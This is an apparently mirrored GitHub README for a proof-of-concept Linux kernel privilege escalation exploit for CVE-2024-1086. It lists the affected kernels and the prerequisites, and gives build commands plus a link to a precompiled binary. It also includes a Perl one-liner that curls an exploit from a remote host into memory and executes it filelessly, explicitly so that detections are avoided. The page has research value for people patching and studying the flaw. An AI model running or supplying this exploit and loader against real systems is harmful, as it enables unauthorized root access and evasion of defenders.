<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://github.com/Notselwyn/CVE-2024-1086">Original</a>
    <h1>Debian/Ubuntu privilege escalation PoC exploit for CVE-2024-1086</h1>
    
    <div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text">
<p dir="auto">Universal local privilege escalation Proof-of-Concept exploit for <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1086" rel="nofollow">CVE-2024-1086</a>, working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.</p>
<details open="">
  <summary>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true">
    <path d="M16 3.75v8.5a.75.75 0 0 1-1.136.643L11 10.575v.675A1.75 1.75 0 0 1 9.25 13h-7.5A1.75 1.75 0 0 1 0 11.25v-6.5C0 3.784.784 3 1.75 3h7.5c.966 0 1.75.784 1.75 1.75v.675l3.864-2.318A.75.75 0 0 1 16 3.75Zm-6.5 1a.25.25 0 0 0-.25-.25h-7.5a.25.25 0 0 0-.25.25v6.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-6.5ZM11 8.825l3.5 2.1v-5.85l-3.5 2.1Z"></path>
</svg>
    <span aria-label="Video description exploit_poc.mp4">exploit_poc.mp4</span>
    <span></span>
  </summary>

  <video src="https://private-user-images.githubusercontent.com/68616630/316254619-a3d43951-94ab-4c09-a14b-07b81f89b3de.mp4?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE0NzAxMDQsIm5iZiI6MTcxMTQ2OTgwNCwicGF0aCI6Ii82ODYxNjYzMC8zMTYyNTQ2MTktYTNkNDM5NTEtOTRhYi00YzA5LWExNGItMDdiODFmODliM2RlLm1wND9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDAzMjYlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwMzI2VDE2MTY0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTFkMTg1YTU5N2E5NDVhNGZiNDU3YTU2NzAxMDExOWJkOWI3Njc0MGJiZGEzZDlhMTc3YzI4MjNhM2Y0NjRhMTQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.JjJeHWR_EFnxYmBgfSe2wj5LnT5AlBDrmpsAOEQXV1g" data-canonical-src="https://private-user-images.githubusercontent.com/68616630/316254619-a3d43951-94ab-4c09-a14b-07b81f89b3de.mp4?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE0NzAxMDQsIm5iZiI6MTcxMTQ2OTgwNCwicGF0aCI6Ii82ODYxNjYzMC8zMTYyNTQ2MTktYTNkNDM5NTEtOTRhYi00YzA5LWExNGItMDdiODFmODliM2RlLm1wND9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDAzMjYlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwMzI2VDE2MTY0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTFkMTg1YTU5N2E5NDVhNGZiNDU3YTU2NzAxMDExOWJkOWI3Njc0MGJiZGEzZDlhMTc3YzI4MjNhM2Y0NjRhMTQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.JjJeHWR_EFnxYmBgfSe2wj5LnT5AlBDrmpsAOEQXV1g" controls="controls" muted="muted">

  </video>
</details>


<p dir="auto">A full write-up of the exploit - including background information and loads of useful diagrams - can be found in the <a href="https://pwning.tech/nftables/" rel="nofollow">Flipping Pages blogpost</a>.</p>

<p dir="auto">The exploit affects versions from (including) v5.14 to (including) v6.6, excluding patched branches v5.15.149&gt;, v6.1.76&gt;, v6.6.15&gt;. The patch for these versions were released in feb 2024. The underlying vulnerability affects all versions (excluding patched stable branches) from v3.15 to v6.8-rc1.</p>
<p dir="auto"><strong>Caveats:</strong></p>
<ul dir="auto">
<li>The exploit does not work v6.4&gt; kernels with kconfig <code>CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y</code> (including Ubuntu v6.5)</li>
<li>The exploits requires user namespaces (kconfig <code>CONFIG_USER_NS=y</code>), that those user namespaces are unprivileged (sh command <code>sysctl kernel.unprivileged_userns_clone</code> = 1), and that nf_tables is enabled (kconfig <code>CONFIG_NF_TABLES=y</code>). By default, these are all enabled on Debian, Ubuntu, and KernelCTF. Other distro&#39;s have not been tested, but may work as well.</li>
<li>The exploit may be unstable on systems with a lot of network activity
<ul dir="auto">
<li>Systems with WiFi adapter, when surrounded by high-usage WiFi networks, will be very unstable.</li>
<li>On test devices, please turn off WiFi adapters through BIOS.</li>
</ul>
</li>
</ul>


<p dir="auto">The default values should work out of the box on Debian, Ubuntu, and KernelCTF with a local shell. On non-tested setups/distros, please make sure the kconfig values match with the target kernel. These can be specified in <a href="https://github.com/Notselwyn/CVE-2024-1086/blob/main/src/config.h"><code>src/config.h</code></a>. If you are running the exploit on a machine with more than 32GiB physical memory, make sure to increase <code>CONFIG_PHYS_MEM</code>.
If you are running the exploit over SSH (into the test machine) or a reverse shell, you may want to toggle <code>CONFIG_REDIRECT_LOG</code> to <code>1</code> to avoid unnecessary network activity.</p>

<p dir="auto">If this is impractical for you, there is an <a href="https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0.0/exploit">compiled x64 binary</a> with the default config.</p>
<div dir="auto" data-snippet-clipboard-copy-content="git clone https://github.com/Notselwyn/CVE-2024-1086
cd CVE-2024-1086
make"><pre>git clone https://github.com/Notselwyn/CVE-2024-1086
<span>cd</span> CVE-2024-1086
make</pre></div>
<p dir="auto">Binary: <code>CVE-2024-1086/exploit</code></p>

<p dir="auto">Running the exploit is just as trivial:</p>

<p dir="auto">Fileless execution is also supported, in case of pentest situations where detections need to be avoided. However, Perl needs to be installed on the target:</p>
<div dir="auto" data-snippet-clipboard-copy-content="perl -e &#39;
  require qw/syscall.ph/;

  my $fd = syscall(SYS_memfd_create(), $fn, 0);
  open(my $fh, &#34;&gt;&amp;=&#34;.$fd);
  print $fh `curl https://example.com/exploit -s`;
  exec {&#34;/proc/$$/fd/$fd&#34;} &#34;memfd&#34;;
&#39;"><pre>perl -e <span><span>&#39;</span></span>
<span>  require qw/syscall.ph/;</span>
<span></span>
<span>  my $fd = syscall(SYS_memfd_create(), $fn, 0);</span>
<span>  open(my $fh, &#34;&gt;&amp;=&#34;.$fd);</span>
<span>  print $fh `curl https://example.com/exploit -s`;</span>
<span>  exec {&#34;/proc/$$/fd/$fd&#34;} &#34;memfd&#34;;</span>
<span><span>&#39;</span></span></pre></div>

<p dir="auto">The programs and scripts (&#34;programs&#34;) in this software directory/folder/repository (&#34;repository&#34;) are published, developed and distributed for educational/research purposes only. I (&#34;the creator&#34;) do not condone any malicious or illegal usage of the programs in this repository, as the intend is sharing research and not doing illegal activities with it. I am not legally responsible for anything you do with the programs in this repository.</p>
</article></div></div>
  </body>
</html>
